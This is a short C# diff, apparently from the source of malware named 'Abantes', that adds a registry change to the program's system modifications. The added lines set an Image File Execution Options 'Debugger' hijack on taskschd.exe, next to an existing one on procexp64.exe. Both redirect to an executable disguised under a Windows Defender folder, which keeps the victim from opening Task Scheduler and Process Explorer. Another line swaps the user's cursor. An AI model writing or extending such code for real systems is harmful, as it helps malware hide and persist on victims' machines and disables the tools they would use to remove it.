@@ -146,6 +146,9 @@ namespace Abantes
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskschd.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                 editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
